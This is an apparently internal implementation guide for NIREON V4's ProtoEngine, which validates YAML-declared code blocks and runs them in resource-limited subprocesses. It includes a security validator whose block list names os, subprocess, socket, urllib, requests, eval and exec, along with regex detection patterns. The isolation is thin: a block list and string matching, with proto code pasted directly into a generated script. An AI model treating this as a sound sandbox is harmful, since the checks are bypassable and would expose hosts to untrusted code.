# ProtoEngine Implementation Guide for NIREON V4

## Context: Dual-Plane Execution Architecture

NIREON V4 operates on two complementary execution planes:
- **Mechanism Plane**: The existing MechanismGateway handles in-process components (Explorer, Catalyst, etc.) for static, trusted operations
- **Proto Plane**: The new ProtoEngine introduces out-of-process execution for dynamic, declarative tasks requiring isolation and security boundaries

This guide focuses on implementing the Proto Plane while maintaining clean integration with the existing Mechanism infrastructure.

## Executive Summary

**ProtoEngine** is a declarative-to-executable transformation system within the NIREON architecture. It receives structured cognitive intent in the form of `Proto` blocks (YAML), validates them, synthesizes runnable code, and executes that code in a secure, isolated containerized environment.

This engine is **domain-agnostic** — it is not a math engine, proof engine, or graph engine per se. It is a **generic execution substrate** for Proto-based reasoning tasks. Each Proto dialect (`eidos: math`, `eidos: graph`, etc.) can be routed through the **ProtoGateway** to its corresponding container implementation, enabling composable, secure, reproducible cognitive workflows.

### What It Does

- Accepts Proto YAML (structured declarations of task, input, limits, intent)
- Validates the block against schema and security rules
- Generates executable code (e.g., Python) via templates or LLMs
- Executes the code inside a Docker container with resource limits
- Emits structured result output, including artifacts if applicable

### Naming Clarification

- `ProtoBlock`: A raw declarative unit (YAML) before typing
- `ProtoEngine`: The container executor for Proto blocks
- `ProtoResultSignal`: The response from container execution
- `eidos`: Dialect label for the Proto, e.g. `math`, `graph`, `simulation`

### Example Dialect Specializations

| Dialect (`eidos`) | Container Name | Entry Class |
|------------------|----------------|-------------|
| `math` | `nireon-proto-math-runner` | `ProtoMathEngine` |
| `graph` | `nireon-proto-graph-runner` | `ProtoGraphEngine` |
| `simulate` | `nireon-proto-sim-runner` | `ProtoSimEngine` |

This pattern is extensible and declarative. New Proto engines can be added by plugging in validators, code generators, and Docker images — no changes to the core system required.

## Prerequisites
- NIREON V4 system with working ComponentRegistry, EventBus, and Reactor
- Python 3.12+ environment with subprocess capabilities (or Docker for containerized execution)
- Understanding of NIREON's signal-based architecture and Proto-based epistemic model

## Implementation Phases

### Phase 1: Core Infrastructure (Week 1-2)

#### 1.1 Proto Schema Definition

**Location:** `nireon_v4/domain/proto/`

For better organization with multiple dialects:
- `nireon_v4/domain/proto/base_schema.py` - Base ProtoBlock class
- `nireon_v4/domain/proto/math/schema.py` - Math-specific Proto schemas  
- `nireon_v4/domain/proto/graph/schema.py` - Graph-specific Proto schemas
- `nireon_v4/domain/proto/validation.py` - Validation framework

**File:** `base_schema.py`

```python
from pydantic import BaseModel, Field, validator
from typing import Dict, Any, List, Optional, Literal, Union
from datetime import datetime
import ast

class ProtoBlock(BaseModel):
    """Base Proto schema for all epistemic dialects."""
    schema_version: str = Field(default="proto/1.0", description="Proto schema version")
    id: str = Field(..., description="Unique identifier for this Proto block")
    eidos: str = Field(..., description="Dialect identifier (math, graph, simulate, etc.)")
    description: str = Field(..., description="Human-readable description")
    objective: str = Field(..., description="What this analysis aims to achieve")
    
    # Core execution parameters
    function_name: str = Field(..., description="Entry point function name in the code")
    code: str = Field(..., description="Code to execute (language depends on eidos)")
    inputs: Dict[str, Any] = Field(default_factory=dict, description="Input parameters")
    
    # Execution constraints
    limits: Dict[str, Any] = Field(default_factory=lambda: {"timeout_sec": 10, "memory_mb": 256})
    
    # Metadata
    metadata: Optional[Dict[str, Any]] = Field(default_factory=dict)
    context: Dict[str, Any] = Field(default_factory=dict)
    requirements: List[str] = Field(default_factory=list, description="Package requirements")
    
    @validator('id')
    def validate_id(cls, v):
        # Ensure ID follows naming convention
        if not v.replace('_', '').replace('-', '').isalnum():
            raise ValueError("ID must contain only alphanumeric characters, hyphens, and underscores")
        return v
    
    @validator('code')
    def validate_code_structure(cls, v, values):
        function_name = values.get('function_name')
        eidos = values.get('eidos')
        
        # Use AST-based validation for robustness
        if function_name:
            try:
                tree = ast.parse(v)
                function_found = False
                for node in ast.walk(tree):
                    if isinstance(node, ast.FunctionDef) and node.name == function_name:
                        function_found = True
                        break
                
                if not function_found:
                    raise ValueError(f"Code must define function '{function_name}'")
            except SyntaxError as e:
                raise ValueError(f"Code contains syntax errors: {e}")
        
        return v
    
    class Config:
        extra = "forbid"

class ProtoMathBlock(ProtoBlock):
    """Specialized Proto block for mathematical dialect."""
    eidos: Literal['math'] = 'math'
    
    # Math-specific metadata
    equation_latex: Optional[str] = Field(default=None, description="LaTeX representation of key equations")
    
    # Override default limits for math
    limits: Dict[str, Any] = Field(default_factory=lambda: {
        "timeout_sec": 10, 
        "memory_mb": 256,
        "allowed_imports": ["matplotlib.pyplot", "numpy", "pandas", "scipy", "sympy", "math", "statistics"]
    })

class ProtoGraphBlock(ProtoBlock):
    """Specialized Proto block for graph analysis dialect."""
    eidos: Literal['graph'] = 'graph'
    
    # Graph-specific metadata
    graph_format: Optional[str] = Field(default="networkx", description="Graph library format")
    
    limits: Dict[str, Any] = Field(default_factory=lambda: {
        "timeout_sec": 20,
        "memory_mb": 512,
        "allowed_imports": ["networkx", "numpy", "matplotlib.pyplot", "pandas"]
    })

# Additional dialect blocks can be added here...
```

**File:** `validation.py`

```python
import ast
import re
from typing import List, Set, Dict, Type
from abc import ABC, abstractmethod
from .base_schema import ProtoBlock, ProtoMathBlock, ProtoGraphBlock

class ProtoValidator(ABC):
    """Abstract base validator for Proto blocks."""
    
    @abstractmethod
    def validate(self, proto: ProtoBlock) -> List[str]:
        """Validate a Proto block. Returns list of errors."""
        pass

class SecurityValidator(ProtoValidator):
    """Universal security validator for all Proto dialects."""
    
    # Security: Dangerous imports/functions to block universally
    BLOCKED_IMPORTS = {
        'os', 'subprocess', 'sys', 'shutil', 'socket', 'urllib', 'requests',
        'pickle', 'eval', 'exec', 'open', '__import__', 'compile'
    }
    
    def validate(self, proto: ProtoBlock) -> List[str]:
        """Perform security validation on any Proto block."""
        errors = []
        
        # Validate code syntax
        try:
            ast.parse(proto.code)
        except SyntaxError as e:
            errors.append(f"Syntax error in code: {e}")
            return errors  # Don't continue if syntax is broken
        
        # Security validation
        errors.extend(self._validate_security(proto))
        
        # Resource limits validation
        if proto.limits.get('timeout_sec', 0) > 30:
            errors.append("Timeout cannot exceed 30 seconds")
        
        if proto.limits.get('memory_mb', 0) > 1024:
            errors.append("Memory limit cannot exceed 1024 MB")
        
        return errors
    
    def _validate_security(self, proto: ProtoBlock) -> List[str]:
        """Check for security violations in code."""
        errors = []
        
        # Check for blocked imports
        tree = ast.parse(proto.code)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for name in node.names:
                    if name.name in self.BLOCKED_IMPORTS:
                        errors.append(f"Blocked import: {name.name}")
            elif isinstance(node, ast.ImportFrom):
                if node.module and node.module.split('.')[0] in self.BLOCKED_IMPORTS:
                    errors.append(f"Blocked import: {node.module}")
        
        # Check for dangerous function calls
        dangerous_patterns = [
            r'open\s*\(',
            r'eval\s*\(',
            r'exec\s*\(',
            r'__import__\s*\(',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, proto.code):
                errors.append(f"Dangerous pattern detected: {pattern}")
        
        return errors

class MathProtoValidator(ProtoValidator):
    """Validator specific to math dialect Proto blocks."""
    
    ALLOWED_IMPORTS = {
        'matplotlib.pyplot', 'numpy', 'pandas', 'math', 'statistics',
        'scipy', 'sympy', 'datetime', 'json', 'csv'
    }
    
    def __init__(self):
        self.security_validator = SecurityValidator()
    
    def validate(self, proto: ProtoMathBlock) -> List[str]:
        """Validate a math Proto block."""
        errors = []
        
        # First run security validation
        errors.extend(self.security_validator.validate(proto))
        
        # Math-specific validation
        if not self._function_exists(proto.code, proto.function_name):
            errors.append(f"Function '{proto.function_name}' not found in code")
        
        # Check allowed imports for math
        allowed = set(proto.limits.get('allowed_imports', self.ALLOWED_IMPORTS))
        used_imports = self._get_imports(proto.code)
        
        for imp in used_imports:
            if not any(imp.startswith(allowed_imp) for allowed_imp in allowed):
                errors.append(f"Import '{imp}' not in allowed list for math dialect")
        
        return errors
    
    def _function_exists(self, code: str, function_name: str) -> bool:
        """Check if the specified function exists in the code."""
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef) and node.name == function_name:
                    return True
        except:
            pass
        return False
    
    def _get_imports(self, code: str) -> Set[str]:
        """Extract all imports from code."""
        imports = set()
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        imports.add(alias.name)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        imports.add(node.module)
        except:
            pass
        return imports

# Validator registry for different dialects
DIALECT_VALIDATORS: Dict[str, Type[ProtoValidator]] = {
    'math': MathProtoValidator,
    # TODO: Add when implementing graph dialect
    # 'graph': GraphProtoValidator,
    # TODO: Add when implementing simulate dialect  
    # 'simulate': SimulationProtoValidator,
}

def get_validator_for_dialect(eidos: str) -> ProtoValidator:
    """Get the appropriate validator for a Proto dialect."""
    validator_class = DIALECT_VALIDATORS.get(eidos)
    if not validator_class:
        # Fall back to security-only validation for unknown dialects (safe by default)
        return SecurityValidator()
    return validator_class()
```

#### 1.2 New Signal Types

**Location:** `nireon_v4/signals/core.py` (add to existing file)

```python
class ProtoTaskSignal(EpistemicSignal):
    """Signal carrying a Proto block for type expansion and execution."""
    signal_type: Literal['ProtoTaskSignal'] = 'ProtoTaskSignal'
    proto_block: Dict[str, Any] = Field(description="The Proto block to execute")
    execution_priority: int = Field(default=5, description="Execution priority (1-10)")
    dialect: str = Field(description="Proto dialect (eidos value)")

class ProtoResultSignal(EpistemicSignal):
    """Signal carrying execution results from any Proto dialect."""
    signal_type: Literal['ProtoResultSignal'] = 'ProtoResultSignal'
    proto_block_id: str = Field(description="ID of the executed Proto block")
    dialect: str = Field(description="Proto dialect that was executed")
    success: bool = Field(description="Whether execution succeeded")
    result: Any = Field(description="Execution result")
    artifacts: List[str] = Field(default_factory=list, description="Generated artifact paths")
    execution_time_sec: float = Field(description="Execution duration")
    metadata: Dict[str, Any] = Field(default_factory=dict)

class ProtoErrorSignal(EpistemicSignal):
    """Signal indicating Proto execution failure."""
    signal_type: Literal['ProtoErrorSignal'] = 'ProtoErrorSignal'
    proto_block_id: str = Field(description="ID of the failed Proto block")
    dialect: str = Field(description="Proto dialect that failed")
    error_type: str = Field(description="Type of error (validation, execution, timeout)")
    error_message: str = Field(description="Detailed error message")
    execution_context: Dict[str, Any] = Field(default_factory=dict)

# Dialect-specific result signals can extend the base
class MathProtoResultSignal(ProtoResultSignal):
    """Math-specific result signal with additional fields."""
    dialect: Literal['math'] = 'math'
    equation_latex: Optional[str] = Field(default=None)
    numeric_result: Optional[Union[float, List[float], Dict[str, float]]] = Field(default=None)
```

#### 1.3 Configuration Models

**Location:** `nireon_v4/proto_engine/config.py`

```python
from pydantic import BaseModel, Field, validator
from typing import List, Dict, Any, Optional
from pathlib import Path

class ProtoEngineConfig(BaseModel):
    """Configuration for the ProtoEngine mechanism."""
    
    # Execution environment
    execution_mode: str = Field(default="subprocess", description="Execution mode: subprocess or docker")
    python_executable: str = Field(default="python", description="Python executable for subprocess mode")
    docker_image_prefix: str = Field(default="nireon-proto", description="Docker image prefix for containers")
    
    # Working directories
    work_directory: str = Field(default="runtime/proto/workspace", description="Working directory for executions")
    artifacts_directory: str = Field(default="runtime/proto/artifacts", description="Directory for output artifacts")
    
    # Security limits (defaults from security research best practices)
    default_timeout_sec: int = Field(default=10, ge=1, le=30)
    default_memory_mb: int = Field(default=256, ge=64, le=1024)
    max_file_size_mb: int = Field(default=10, ge=1, le=50)
    
    # Dialect-specific settings
    dialect_configs: Dict[str, Dict[str, Any]] = Field(default_factory=dict)
    
    # Monitoring and cleanup
    cleanup_after_execution: bool = Field(default=True)
    retain_artifacts_hours: int = Field(default=24, ge=1, le=168)  # Max 1 week
    
    # Integration settings
    event_bus_timeout_sec: int = Field(default=30)
    
    @validator('work_directory', 'artifacts_directory')
    def ensure_directory_exists(cls, v):
        Path(v).mkdir(parents=True, exist_ok=True)
        return v
    
    def get_dialect_config(self, dialect: str) -> Dict[str, Any]:
        """Get configuration specific to a dialect."""
        return self.dialect_configs.get(dialect, {})
    
    class Config:
        extra = "forbid"

class ProtoMathEngineConfig(ProtoEngineConfig):
    """Configuration specific to math dialect execution."""
    
    # Math-specific package allowlist
    allowed_packages: List[str] = Field(
        default_factory=lambda: [
            "matplotlib", "numpy", "pandas", "scipy", "sympy", 
            "seaborn", "plotly", "statsmodels"
        ]
    )
    
    # Math-specific execution settings
    enable_latex_rendering: bool = Field(default=True)
    plot_dpi: int = Field(default=150)
    
    def __init__(self, **data):
        super().__init__(**data)
        # Set math-specific dialect config
        self.dialect_configs['math'] = {
            'allowed_packages': self.allowed_packages,
            'enable_latex': self.enable_latex_rendering,
            'plot_dpi': self.plot_dpi
        }
```

### Phase 2: ProtoEngine Component (Week 2-3)

#### 2.1 Core ProtoEngine Implementation

**Location:** `nireon_v4/proto_engine/service.py`

```python
import asyncio
import subprocess
import tempfile
import uuid
import json
import shutil
import time
import resource
from pathlib import Path
from typing import Dict, Any, List, Optional, Type
from concurrent.futures import ProcessPoolExecutor, TimeoutError
from abc import ABC, abstractmethod

from nireon_v4.application.components.base import NireonBaseComponent
from nireon_v4.application.context import ExecutionContext
from nireon_v4.application.components.lifecycle import ProcessResult, ComponentHealth
from nireon_v4.signals.core import ProtoResultSignal, ProtoErrorSignal, MathProtoResultSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock, ProtoMathBlock
from nireon_v4.domain.proto.validation import get_validator_for_dialect

from .config import ProtoEngineConfig
from .executors import SubprocessExecutor, DockerExecutor

class ProtoGateway:
    """
    Lightweight dispatcher for Proto blocks.
    
    Routes ProtoTaskSignal payloads to the correct ProtoEngine instance
    based on the Proto block's dialect (`eidos`). Mirrors the existing
    MechanismGateway pattern but operates on out-of-process Proto engines.
    """

    def __init__(self, registry, dialect_to_component: Dict[str, str]):
        """
        Args:
            registry: ComponentRegistry used to fetch ProtoEngine instances
            dialect_to_component: Maps `eidos` strings → component_id of the target ProtoEngine
                Example: {"math": "proto_engine_math", "graph": "proto_engine_graph"}
        """
        self.registry = registry
        self.dialect_map = dialect_to_component

    async def handle(self, signal: ProtoTaskSignal, ctx: ExecutionContext):
        """Entry-point subscribed to ProtoTaskSignal events."""
        proto = signal.proto_block
        dialect = proto.get("eidos", "unknown")

        component_id = self.dialect_map.get(dialect)
        if not component_id:
            await self._emit_routing_error(signal, dialect, ctx)
            return

        engine = self.registry.get_service_instance(component_id)
        if not engine:
            await self._emit_routing_error(signal, dialect, ctx, "component_not_found")
            return

        # Forward to the engine and bubble up its ProcessResult if needed
        await engine.process({"proto_block": proto, "dialect": dialect}, ctx)

    async def _emit_routing_error(
        self,
        signal: ProtoTaskSignal,
        dialect: str,
        ctx: ExecutionContext,
        code: str = "no_engine_for_dialect",
    ):
        err = ProtoErrorSignal(
            source_node_id="proto_gateway",
            proto_block_id=signal.proto_block.get("id", "unknown"),
            dialect=dialect,
            error_type=code,
            error_message=f"ProtoGateway has no target for dialect '{dialect}'",
        )
        await ctx.event_bus.publish(err.signal_type, err.dict())

class ProtoEngine(NireonBaseComponent):
    """
    NIREON component for executing typed Proto blocks.
    
    This is a domain-agnostic execution engine that can handle any Proto dialect
    by routing to appropriate executors and validators.
    """
    
    def __init__(self, instance_id: str, config: ProtoEngineConfig, **kwargs):
        super().__init__(instance_id, config, **kwargs)
        self.config: ProtoEngineConfig = config
        self._executors: Dict[str, Any] = {}
        self._initialize_executors()
    
    def _initialize_executors(self):
        """Initialize execution backends based on configuration."""
        if self.config.execution_mode == "subprocess":
            self._executors['default'] = SubprocessExecutor(self.config)
        elif self.config.execution_mode == "docker":
            self._executors['default'] = DockerExecutor(self.config)
        
        # Dialect-specific executors can be registered here
        # self._executors['math'] = MathSpecificExecutor(self.config)
    
    async def initialize(self, context: ExecutionContext) -> None:
        """Initialize the proto engine."""
        await super().initialize(context)
        
        # Ensure directories exist
        Path(self.config.work_directory).mkdir(parents=True, exist_ok=True)
        Path(self.config.artifacts_directory).mkdir(parents=True, exist_ok=True)
        
        self.logger.info(f"ProtoEngine {self.instance_id} initialized in {self.config.execution_mode} mode")
    
    async def process(self, data: Any, context: ExecutionContext) -> ProcessResult:
        """Process a ProtoTaskSignal - performs type expansion and execution."""
        
        try:
            # Extract Proto block
            if isinstance(data, dict) and 'proto_block' in data:
                proto_data = data['proto_block']
                dialect = data.get('dialect') or proto_data.get('eidos', 'unknown')
            else:
                return ProcessResult(
                    success=False,
                    message="Invalid input: expected Proto block data",
                    component_id=self.instance_id
                )
            
            # Type Expansion: Create appropriate Proto type based on dialect
            typed_proto = self._expand_proto_type(proto_data, dialect)
            if isinstance(typed_proto, str):  # Error message
                await self._emit_error_signal(
                    proto_data.get('id', 'unknown'),
                    dialect,
                    'type_expansion',
                    typed_proto,
                    context
                )
                return ProcessResult(
                    success=False,
                    message=typed_proto,
                    component_id=self.instance_id
                )
            
            # Validation using dialect-specific validator
            validator = get_validator_for_dialect(dialect)
            validation_errors = validator.validate(typed_proto)
            
            if validation_errors:
                error_msg = "; ".join(validation_errors)
                await self._emit_error_signal(
                    typed_proto.id,
                    dialect,
                    'validation',
                    f"Validation failed: {error_msg}",
                    context
                )
                return ProcessResult(
                    success=False,
                    message=f"Validation failed: {error_msg}",
                    component_id=self.instance_id
                )
            
            # Execute the typed proto using appropriate executor
            executor = self._get_executor_for_dialect(dialect)
            result = await executor.execute(typed_proto, context)
            
            if result['success']:
                # Emit dialect-specific result signal
                await self._emit_result_signal(typed_proto, result, context)
                
                return ProcessResult(
                    success=True,
                    message=f"Successfully executed Proto block {typed_proto.id} (dialect: {dialect})",
                    component_id=self.instance_id,
                    output_data=result
                )
            else:
                # Emit error signal
                await self._emit_error_signal(
                    typed_proto.id,
                    dialect,
                    'execution',
                    result.get('error', 'Unknown execution error'),
                    context
                )
                return ProcessResult(
                    success=False,
                    message=f"Execution failed: {result.get('error')}",
                    component_id=self.instance_id,
                    output_data=result
                )
        
        except Exception as e:
            self.logger.error(f"Unexpected error in ProtoEngine: {e}", exc_info=True)
            return ProcessResult(
                success=False,
                message=f"Unexpected error: {e}",
                component_id=self.instance_id
            )
    
    def _expand_proto_type(self, proto_data: Dict[str, Any], dialect: str) -> Union[ProtoBlock, str]:
        """Expand raw Proto data into typed Proto based on dialect."""
        try:
            if dialect == 'math':
                return ProtoMathBlock(**proto_data)
            elif dialect == 'graph':
                # return ProtoGraphBlock(**proto_data)
                return ProtoBlock(**proto_data)  # Fallback for now
            else:
                # Generic Proto block for unknown dialects
                return ProtoBlock(**proto_data)
        except Exception as e:
            return f"Proto type expansion failed for dialect '{dialect}': {e}"
    
    def _get_executor_for_dialect(self, dialect: str):
        """Get the appropriate executor for a dialect."""
        # Return dialect-specific executor if available, otherwise default
        return self._executors.get(dialect, self._executors['default'])
    
    async def _emit_result_signal(self, typed_proto: ProtoBlock, result: Dict[str, Any], context: ExecutionContext):
        """Emit appropriate result signal based on dialect."""
        
        base_data = {
            'source_node_id': self.instance_id,
            'proto_block_id': typed_proto.id,
            'dialect': typed_proto.eidos,
            'success': True,
            'result': result.get('result'),
            'artifacts': result.get('artifacts', []),
            'execution_time_sec': result.get('execution_time_sec', 0),
            'metadata': {
                'function_name': typed_proto.function_name,
                'objective': typed_proto.objective
            }
        }
        
        # Create dialect-specific signal
        if typed_proto.eidos == 'math' and isinstance(typed_proto, ProtoMathBlock):
            signal = MathProtoResultSignal(
                **base_data,
                equation_latex=typed_proto.equation_latex,
                numeric_result=result.get('result')
            )
        else:
            signal = ProtoResultSignal(**base_data)
        
        if hasattr(context, 'event_bus') and context.event_bus:
            await context.event_bus.publish(signal.signal_type, signal.dict())
    
    async def _emit_error_signal(self, proto_id: str, dialect: str, error_type: str, 
                                error_message: str, context: ExecutionContext):
        """Emit ProtoErrorSignal for failed execution."""
        
        signal = ProtoErrorSignal(
            source_node_id=self.instance_id,
            proto_block_id=proto_id,
            dialect=dialect,
            error_type=error_type,
            error_message=error_message,
            execution_context={"component_id": self.instance_id}
        )
        
        if hasattr(context, 'event_bus') and context.event_bus:
            await context.event_bus.publish(signal.signal_type, signal.dict())
    
    async def health_check(self, context: ExecutionContext) -> ComponentHealth:
        """Check component health."""
        
        try:
            # Check if directories are accessible
            work_path = Path(self.config.work_directory)
            artifacts_path = Path(self.config.artifacts_directory)
            
            if not work_path.exists() or not artifacts_path.exists():
                return ComponentHealth(
                    status="unhealthy",
                    message="Required directories not accessible"
                )
            
            # Check executors
            if not self._executors:
                return ComponentHealth(
                    status="unhealthy",
                    message="No executors available"
                )
            
            return ComponentHealth(
                status="healthy",
                message=f"ProtoEngine ready ({self.config.execution_mode} mode)"
            )
            
        except Exception as e:
            return ComponentHealth(
                status="unhealthy",
                message=f"Health check failed: {e}"
            )
    
    async def cleanup(self):
        """Cleanup resources."""
        for executor in self._executors.values():
            if hasattr(executor, 'cleanup'):
                await executor.cleanup()
        await super().cleanup()
```

**Location:** `nireon_v4/proto_engine/executors.py`

```python
from abc import ABC, abstractmethod
import asyncio
import subprocess
import uuid
import json
import time
import shutil
import platform
from pathlib import Path
from typing import Dict, Any
from concurrent.futures import ProcessPoolExecutor

from nireon_v4.domain.proto.base_schema import ProtoBlock
from nireon_v4.application.context import ExecutionContext
from .config import ProtoEngineConfig

class ExternalExecutor(ABC):
    """Abstract base class for external executors (Proto and future containerized Mechanisms)."""
    
    @abstractmethod
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute a Proto block and return results."""
        pass

class SubprocessExecutor(ExternalExecutor):
    """Executes Proto blocks in isolated subprocesses.
    
    Note: Current MVP ignores the 'requirements' field in Proto blocks.
    DockerExecutor will eventually validate requirements against an allow-list.
    """
    
    def __init__(self, config: ProtoEngineConfig):
        self.config = config
        self._executor = ProcessPoolExecutor(max_workers=2)
        
        # NOTE: Uses resource.setrlimit → Unix only.  
        # For Windows hosts rely on DockerExecutor.
        if platform.system() == 'Windows':
            import warnings
            warnings.warn(
                "SubprocessExecutor uses resource limits that are Unix-only. "
                "Consider using DockerExecutor for Windows hosts.",
                RuntimeWarning
            )
    
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute Proto in subprocess."""
        
        execution_data = {
            'proto_block': proto.dict(),
            'work_directory': self.config.work_directory,
            'artifacts_directory': self.config.artifacts_directory,
            'timeout_sec': proto.limits.get('timeout_sec', self.config.default_timeout_sec),
            'memory_mb': proto.limits.get('memory_mb', self.config.default_memory_mb),
            'dialect_config': self.config.get_dialect_config(proto.eidos)
        }
        
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                self._executor,
                _execute_in_subprocess,
                execution_data
            )
            return result
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
    
    async def cleanup(self):
        """Cleanup executor resources."""
        if self._executor:
            self._executor.shutdown(wait=True)

class DockerExecutor(ExternalExecutor):
    """Executes Proto blocks in Docker containers."""
    
    def __init__(self, config: ProtoEngineConfig):
        self.config = config
    
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute Proto in Docker container."""
        
        # TODO: Register DockerExecutor in manifest once image 'nireon-proto-{dialect}-runner' is built
        # Docker implementation will provide cross-platform resource limits replacing Linux-specific
        # resource module constraints, ensuring consistent behavior across all environments.
        # Implementation steps:
        # 1. Select appropriate image based on proto.eidos
        # 2. Mount code and inputs as volumes
        # 3. Run container with resource limits
        # 4. Capture output and artifacts
        return {
            "success": False,
            "error": "Docker execution not yet implemented",
            "error_type": "NotImplementedError"
        }

def _execute_in_subprocess(execution_data: Dict[str, Any]) -> Dict[str, Any]:
    """Execute Proto block in isolated subprocess. Must be top-level for pickling."""
    
    import resource
    import platform
    
    try:
        proto_data = execution_data['proto_block']
        work_dir = Path(execution_data['work_directory'])
        timeout_sec = execution_data['timeout_sec']
        memory_mb = execution_data['memory_mb']
        
        # Create isolated execution directory
        exec_id = str(uuid.uuid4())
        exec_dir = work_dir / exec_id
        exec_dir.mkdir(parents=True, exist_ok=True)
        
        # Write the execution script
        script_content = _generate_execution_script(proto_data, exec_dir)
        
        script_path = exec_dir / "execute.py"
        script_path.write_text(script_content)
        
        # Set resource limits (Unix only)
        def set_limits():
            if platform.system() != 'Windows':
                resource.setrlimit(resource.RLIMIT_AS, (memory_mb * 1024 * 1024, memory_mb * 1024 * 1024))
                resource.setrlimit(resource.RLIMIT_CPU, (timeout_sec, timeout_sec))
        
        # Execute with timeout
        start_time = time.time()
        process = subprocess.run(
            ["python", "-I", str(script_path)],
            capture_output=True,
            text=True,
            timeout=timeout_sec,
            preexec_fn=set_limits if platform.system() != 'Windows' else None,
            cwd=exec_dir
        )
        
        execution_time = time.time() - start_time
        
        # Parse result
        result_json = _parse_execution_output(process.stdout)
        
        if result_json is None:
            return {
                "success": False,
                "error": "No result JSON found in output",
                "stdout": process.stdout,
                "stderr": process.stderr
            }
        
        # Handle artifacts
        if result_json.get("success") and result_json.get("artifacts"):
            result_json["artifacts"] = _move_artifacts(
                result_json["artifacts"], 
                exec_dir, 
                execution_data['artifacts_directory'],
                exec_id
            )
        
        result_json["execution_time_sec"] = execution_time
        result_json["subprocess_returncode"] = process.returncode
        
        return result_json
        
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": f"Execution timed out after {timeout_sec} seconds",
            "error_type": "TimeoutError"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "error_type": type(e).__name__
        }
    finally:
        # Cleanup execution directory
        if 'exec_dir' in locals() and exec_dir.exists():
            shutil.rmtree(exec_dir, ignore_errors=True)

def _generate_execution_script(proto_data: Dict[str, Any], exec_dir: Path) -> str:
    """Generate the Python execution script for a Proto block."""
    
    return f"""
import sys
import os
import json
import time
from pathlib import Path

# Set working directory
os.chdir("{exec_dir}")

# Proto code
{proto_data['code']}

# Execute the function
if __name__ == "__main__":
    try:
        # Call the main function
        inputs = {json.dumps(proto_data['inputs'])}
        result = {proto_data['function_name']}(**inputs)
        
        # Look for generated files
        artifacts = []
        for file_path in Path(".").iterdir():
            if file_path.is_file() and file_path.suffix in ['.png', '.pdf', '.svg', '.html', '.csv', '.json']:
                artifacts.append(str(file_path))
        
        # Output results as JSON
        output = {{
            "success": True,
            "result": result,
            "artifacts": artifacts,
            "execution_time": time.time()
        }}
        print("RESULT_JSON:" + json.dumps(output))
        
    except Exception as e:
        error_output = {{
            "success": False,
            "error": str(e),
            "error_type": type(e).__name__
        }}
        print("RESULT_JSON:" + json.dumps(error_output))
"""

def _parse_execution_output(stdout: str) -> Optional[Dict[str, Any]]:
    """Parse execution output to extract result JSON."""
    stdout_lines = stdout.strip().split('\n')
    
    for line in stdout_lines:
        if line.startswith("RESULT_JSON:"):
            try:
                return json.loads(line[12:])
            except json.JSONDecodeError:
                pass
    
    return None

def _move_artifacts(artifacts: List[str], exec_dir: Path, artifacts_dir: str, exec_id: str) -> List[str]:
    """Move artifacts to permanent storage."""
    artifacts_path = Path(artifacts_dir)
    final_artifacts = []
    
    for artifact in artifacts:
        src_path = exec_dir / artifact
        if src_path.exists():
            final_path = artifacts_path / f"{exec_id}_{artifact}"
            shutil.copy2(src_path, final_path)
            final_artifacts.append(str(final_path))
    
    return final_artifacts
```

### Phase 3: Integration & Reactor Rules (Week 3-4)

#### 3.1 Reactor Rules for Proto Routing

**Location:** `config/reactor_rules/proto_engine_rules.yaml`

```yaml
rules_definitions:
  # Proto routing through gateway
  - id: "proto_task_router"
    description: "Fan-out Proto tasks to ProtoGateway for dialect-based routing"
    conditions:
      - type: "signal_type_match"
        signal_type: "ProtoTaskSignal"
    actions:
      - type: "trigger_component"
        component_id: "proto_gateway_main"
    default_params:
      priority: 5
      timeout_override: null

  # Dialect-specific result handlers
  - id: "math_proto_result_handler"
    description: "Handles math-specific Proto results"
    conditions:
      - type: "signal_type_match"
        signal_type: "MathProtoResultSignal"
      - type: "payload_value"
        field: "execution_time_sec"
        operator: "lt"
        value: 5.0
    actions:
      - type: "trigger_component"
        component_id: "catalyst_main"
        template_id: "AMPLIFY_PROTO_INSIGHTS"

  - id: "proto_error_handler"
    description: "Handles Proto execution errors"
    conditions:
      - type: "signal_type_match"
        signal_type: "ProtoErrorSignal"
    actions:
      - type: "emit_signal"
        signal_type: "SystemAlert"
        payload_static:
          alert_type: "proto_execution_failure"
          severity: "medium"
      - type: "conditional_action"
        condition:
          field: "error_type"
          operator: "eq"
          value: "timeout"
        action:
          type: "emit_signal"
          signal_type: "ResourceAlert"
          payload_static:
            resource_type: "execution_timeout"
```

#### 3.2 Component Registration in Manifest

**Location:** `config/manifests/proto_engine.yaml`

```yaml
version: "1.0"
metadata:
  name: "NIREON with ProtoEngine"
  description: "NIREON configuration with domain-agnostic Proto execution capabilities"

shared_services:
  llm:
    provider: "openai"
    config:
      model: "${LLM_MODEL:-gpt-4o-mini}"
      temperature: 0.7

  event_bus:
    provider: "memory"
    config:
      max_history: 2000

proto_engines:
  - id: "proto_engine_math"
    class: "nireon_v4.proto_engine.service.ProtoEngine"
    config:
      execution_mode: "${PROTO_EXECUTION_MODE:-subprocess}"  # or "docker"
      work_directory: "${PROTO_WORK_DIR:-runtime/proto/math/workspace}"
      artifacts_directory: "${PROTO_ARTIFACTS_DIR:-runtime/proto/math/artifacts}"
      default_timeout_sec: 15
      default_memory_mb: 512
      
      # Math-specific configuration
      dialect_configs:
        math:
          allowed_packages:
            - "matplotlib"
            - "numpy"
            - "pandas"
            - "scipy"
            - "sympy"
          enable_latex: true
          plot_dpi: 150

  # Additional dialect engines can be added here
  # - id: "proto_engine_graph"
  #   class: "nireon_v4.proto_engine.service.ProtoEngine"
  #   config:
  #     work_directory: "${PROTO_WORK_DIR:-runtime/proto/graph/workspace}"
